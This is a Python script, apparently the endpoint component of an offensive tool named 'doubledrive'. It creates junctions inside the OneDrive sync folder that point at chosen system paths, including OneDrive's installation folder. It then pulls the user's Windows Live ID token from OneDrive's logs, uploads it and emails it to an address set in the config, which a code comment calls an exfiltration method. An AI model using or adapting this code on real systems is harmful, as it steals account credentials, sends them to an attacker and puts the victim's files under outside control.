import os


from config import get_configs, ConfigKey
from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
from doubledrive.endpoint_takeover_utils.reparse_points.reparse_points import create_mount_point
from doubledrive.endpoint_takeover_utils.endpoint_info.onedrive.onedrive_info import get_onedrive_info
from doubledrive.endpoint_takeover_utils.token_extraction.onedrive.onedrive_token_extraction import steal_onedrive_wlid_token


def main():
    onedrive_info = get_onedrive_info()
    configs = get_configs()

    if configs[ConfigKey.SHOULD_CREATE_ONEDRIVE_BINARIES_JUNCTION.value]:
        junctions_names_to_target_paths = configs[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value].copy()
        onedrive_installation_folder_junc_name = configs[ConfigKey.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME.value]
        junctions_names_to_target_paths[onedrive_installation_folder_junc_name] = onedrive_info.version_installation_folder
    else:
       junctions_names_to_target_paths = configs[ConfigKey.JUNCTION_NAMES_TO_TARGET_PATHS.value]

    print("Creating junctions to targets")
    for junction_name, target_path in junctions_names_to_target_paths.items():
        junction_path = os.path.join(onedrive_info.sync_folder, junction_name)
        create_mount_point(junction_path, target_path)

    print("Extracting Windows Live ID token from OneDrive's logs")
    windows_live_token = steal_onedrive_wlid_token()
    if None == windows_live_token:
        print("Did not find the WLID token")
        return 1
    onedrive_session = OneDrive()
    onedrive_session.login_using_token(windows_live_token)
    print("Uploading token to OneDrive")
    onedrive_token_file_item = onedrive_session.create_file(f"/{configs[ConfigKey.TOKEN_FILE_NAME.value]}", windows_live_token)
    print("Sending token file to the configured email address using OneDrive API")

    # OneDrive has some bugs with this API request and sometimes an email is just not sent, without any indication for why.
    # In case that happens to you, you can just replace this exfiltration methos with another one.
    onedrive_session.send_item_to_email(onedrive_token_file_item, configs[ConfigKey.TOKEN_DST_EMAIL_ADDRESS.value])
    


if "__main__" == __name__:
    main()